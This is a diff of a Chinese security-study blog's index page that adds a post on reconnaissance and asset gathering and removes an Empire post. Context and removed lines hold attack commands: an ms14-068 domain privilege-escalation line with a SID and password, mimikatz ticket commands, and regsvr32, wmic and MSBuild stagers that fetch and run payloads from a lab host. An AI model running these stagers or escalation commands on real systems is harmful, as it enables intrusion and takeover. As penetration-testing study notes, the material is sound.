@@ -64,6 +64,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-信息资产收集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" class="article-date">
+  <time datetime="2021-09-19T02:44:32.000Z" itemprop="datePublished">2021-09-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/">信息资产收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="CMS识别技术"><a href="#CMS识别技术" class="headerlink" title="CMS识别技术"></a>CMS识别技术</h3><p>1、人工指纹字典识别<br>2、在线工具<br>3、平台<br>   源码获取技术<br>   架构信息获取</p>
+<h4 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h4><p>①搭建习惯-目录型站点   psy.ruc.edu.cn/bbs<br>②搭建习惯-端口类站点   <a target="_blank" rel="noopener" href="https://www.fkcn.com/">https://www.fkcn.com</a>   <a target="_blank" rel="noopener" href="http://www.fkcn.com:8080/">http://www.fkcn.com:8080</a><br>http 80端口  https 443端口  8080  8443  81<br>③搭建习惯-子域名站点   bbs.goodlift.net/<a target="_blank" rel="noopener" href="http://www.goodlift.net/">www.goodlift.net</a><br>同一个服务器：同IP<br>不同一个服务器<br>    同网段：10.1.1.1/10.1.1.2<br>    不同网段：套用敏感信息<br>④搭建习惯-类似域名站点   <a target="_blank" rel="noopener" href="http://www.jmlsd.cn/www.jmlsd.com">www.jmlsd.cn/www.jmlsd.com</a><br>jingdong.com   jd.com<br>jmlsd.com   jmlsd.cn<br>⑤搭建习惯-旁注，C 段站点<br>#旁注<br>同一个服务器不同站点<br><a target="_blank" rel="noopener" href="http://www.a.com/">www.a.com</a><br><a target="_blank" rel="noopener" href="http://www.b.com/">www.b.com</a><br>…….</p>
+<p>#C段<br>不同服务器不同站点<br><a target="_blank" rel="noopener" href="http://www.a.com/">www.a.com</a><br><a target="_blank" rel="noopener" href="http://www.b.com/">www.b.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.c.com/">www.c.com</a><br><a target="_blank" rel="noopener" href="http://www.d.com/">www.d.com</a></p>
+<h3 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、什么是WAF应用</span><br><span class="line">2、如何识别WAF   wafw00f</span><br><span class="line">3、识别WAF对于安全测试的意义</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;lzgmy1314.cn.vooec.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="信息收集资产"><a href="#信息收集资产" class="headerlink" title="信息收集资产"></a>信息收集资产</h3><h5 id="1、DNS域名和IP"><a href="#1、DNS域名和IP" class="headerlink" title="1、DNS域名和IP"></a>1、DNS域名和IP</h5><p>●子域名查询 - Teemo、layer子域名挖掘机和其他工具    <a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br>●相似域名查询 - burpsuite插件：<a target="_blank" rel="noopener" href="https://github.com/bit4woo/domain_hunter_pro/releases/tag/v1.1">https://github.com/bit4woo/domain_hunter_pro/releases/tag/v1.1</a><br>●在线网站    1、通过HTTPS证书日志搜集 <a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a> 等  2、通过解析记录<br>●搜索引擎   1、白引擎:百度、谷歌    2、黑引擎:fofa，shodan，zoomeye<br>●枚举       写脚本进行子域名枚举查找测试是否存在    x.yucedu.com<br>●从主站爬取   1、从单点登录接口 2、crossdomain.xml文件(跨域访问文件)   淘宝 3、扫描器爬虫<br>●关联     1、网段分析  2、IP反差域名(反向解析)<br>●whois查询和关联查询(联系人信息、邮箱反差域名)</p>
+<h5 id="2、整站分析"><a href="#2、整站分析" class="headerlink" title="2、整站分析"></a>2、整站分析</h5><p>★服务器类型<br>★中间件<br>★脚本类型<br>★数据库类型</p>
+<p>3、敏感目录文件   御剑、Google、wwwscan、dirbuster、cansina等</p>
+<p>4、开放端口信息  nmap、zmap、Masscan等</p>
+<p>5、CMS识别  轻量web指纹识别、云悉指纹、人工识别、hash值字典查询</p>
+<p>6、网站漏洞扫描   Appscan、AWVS、Nessus、OWASP、kali(W3af、openVAS、vega)等</p>
+<p>#APP 提取一键反编译提取<br>#APP 抓数据包进行工具配合</p>
+<p>#内部群内部应用内部接口   社工：QQ群或微信群  其他通讯群聊<br>#微信公众号接口获取</p>
+<h5 id="可供练手的网站"><a href="#可供练手的网站" class="headerlink" title="可供练手的网站"></a>可供练手的网站</h5><p>​    <a target="_blank" rel="noopener" href="http://testfire.net/%EF%BC%8Ctestfire.net%E6%98%AFIBM%E5%85%AC%E5%8F%B8%E4%B8%BA%E4%BA%86%E6%BC%94%E7%A4%BA%E6%97%97%E4%B8%8B%E6%AF%94%E8%BE%83%E6%9C%89%E5%90%8D%E7%9A%84Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8AppScan%E7%9A%84%E5%BC%BA%E5%A4%A7%E5%8A%9F%E8%83%BD%E6%89%80%E6%90%AD%E5%BB%BA%E7%9A%84%E6%A8%A1%E6%8B%9F%E9%93%B6%E8%A1%8C%E7%BD%91%E7%AB%99%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8A%E9%9D%A2%E4%BC%9A%E6%9C%89%E5%BE%88%E5%A4%9A%E5%B8%B8%E8%A7%81%E7%9A%84Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%82">http://testfire.net/，testfire.net是IBM公司为了演示旗下比较有名的Web漏洞扫描器AppScan的强大功能所搭建的模拟银行网站，所以上面会有很多常见的Web安全漏洞。</a><br>​    <a target="_blank" rel="noopener" href="http://vulnweb.com/">http://vulnweb.com/</a>   为了演示AWVS漏洞扫描器所搭建的模拟网站<br>​    <a target="_blank" rel="noopener" href="https://www.butian.net/">https://www.butian.net/</a>  补天平台上的SRC项目</p>
+<h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><p><a target="_blank" rel="noopener" href="https://www.shodan.io/">https://www.shodan.io/</a><br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a><br><a target="_blank" rel="noopener" href="https://www.webscan.cc/">https://www.webscan.cc/</a>   旁注查询<br><a target="_blank" rel="noopener" href="http://tool.chinaz.com/">http://tool.chinaz.com</a>    站长工具<br><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh</a>    查询证书<br><a target="_blank" rel="noopener" href="https://securitytrails.com/domain/www.baidu.com/history/">https://securitytrails.com/domain/www.baidu.com/history/</a>   dns历史记录查询<br><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  WAFW00F工具下载</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckv7qjzsm000pnovjbk1kajte" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-加密编码算法和CDN绕过" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" class="article-date">
@@ -100,7 +154,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckv3dvtwh000wfcvjam2a48ej" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckv7qjzsp000unovj3mul0er0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -139,7 +193,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckv3dvtw30009fcvj3vc90mkg" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckv7qjzs10008novje5ne4i6j" class="article-share-link">Share</a>
       
       
     </footer>
@@ -195,7 +249,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckv3dvtwm0013fcvj0xlo7nx3" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckv7qjzsy0014novj8hi8dmq1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -238,7 +292,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckv3dvtw10006fcvj90um6eg2" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckv7qjzs00007novj1jxt7icb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -283,7 +337,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#117;&#x40;&#105;&#x6c;&#x75;&#x2e;&#99;&#x6f;&#x6d;">&#105;&#x6c;&#117;&#x40;&#105;&#x6c;&#x75;&#x2e;&#99;&#x6f;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#x75;&#64;&#x69;&#108;&#x75;&#x2e;&#x63;&#111;&#109;">&#105;&#x6c;&#x75;&#64;&#x69;&#108;&#x75;&#x2e;&#x63;&#111;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -351,7 +405,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckv3dvtwl0010fcvjag332f27" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckv7qjzsu0010novj39c66uf9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -426,7 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckv3dvtwn0014fcvjhfyi0ki0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckv7qjzsz0015novj8fql93kz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -501,7 +555,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckv3dvtwf000sfcvj6qzk4wcp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckv7qjzsp000vnovj0ifn3nxa" class="article-share-link">Share</a>
       
       
     </footer>
@@ -586,7 +640,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv3dvtwm0012fcvjbtmxblqj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv7qjzsy0013novjf4l90g0g" class="article-share-link">Share</a>
       
       
     </footer>
@@ -641,71 +695,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv3dvtw4000afcvjg7gt6l7k" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-empire提权和持久化" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" class="article-date">
-  <time datetime="2021-08-21T13:28:18.000Z" itemprop="datePublished">2021-08-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/">empire提权和持久化</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="stager的几种用法"><a href="#stager的几种用法" class="headerlink" title="stager的几种用法"></a>stager的几种用法</h2><p>windows/launcher_sct</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;n &#x2F;i:http:&#x2F;&#x2F;192.168.1.135&#x2F;launcher.sct scrobj.dll</span><br><span class="line"></span><br><span class="line">scrobj.dll: 固定的</span><br></pre></td></tr></table></figure>
-
-<p>windows/launcher_vbs</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行: Cscript launcher.vbs</span><br></pre></td></tr></table></figure>
-
-<p>windows/launcher_xml</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行:</span><br><span class="line">cd C:\Windows\Microsoft.NET\Framework\v4.0.30319</span><br><span class="line">.\MSBuild.exe C:\users\一瓢饮\Desktop\la.xml</span><br></pre></td></tr></table></figure>
-
-<p>windows/wmic</p>
-<p>wmic调用: wmic process call create <code>calc</code> –&gt; command</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行: wmic os get &#x2F;format:&quot;http:&#x2F;&#x2F;192.168.1.135&#x2F;la.xsl&quot;</span><br></pre></td></tr></table></figure>
-
-<p>windows/macro</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. word 选项 --&gt; 信任中心 --&gt; 宏设置 --&gt; 启用所有宏</span><br><span class="line">2. 开发工具 --&gt; 宏 --&gt; 创建(所有活动模板和文档) --&gt; templateProject --&gt; microsoft word 对象 --&gt; thisdocment --&gt; 插入宏代码(VBA)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>github | 码云(gitee)</p>
-<p>利用uac</p>
-<p>绕过uac</p>
-<p>本地提权: 漏洞查找 –&gt; <code>powershell/privesc/sherlock</code> | <code>widnows-suggester-exploit.py</code></p>
-<p>powerup</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks 检测是否可以利用powerup漏洞</span><br><span class="line"></span><br><span class="line"># 要检测的事情</span><br><span class="line">[*] Checking if user is in a local group with administrative privileges... </span><br><span class="line"># 探测结果</span><br><span class="line">[+] User is in a local group that grants administrative privileges!</span><br><span class="line"># 利用方式</span><br><span class="line">[+] Run a BypassUAC attack to elevate privileges to admin.</span><br></pre></td></tr></table></figure>
-
-<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>debugger代码修改:</p>
-<p>136-139 用 ‘’’ ‘’’包裹注释</p>
-<p>180按一下tab键对齐</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckv3dvtw4000bfcvj6z8o8hvs" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckv7qjzs20009novjearw7tbl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -751,6 +741,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
           </li>
         
@@ -764,10 +758,6 @@
         
           <li>
             <a href="/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/">文件上传漏洞的利用和验证过滤</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/">sql漏洞注入扩展和Access数据库</a>
           </li>
         
       </ul>
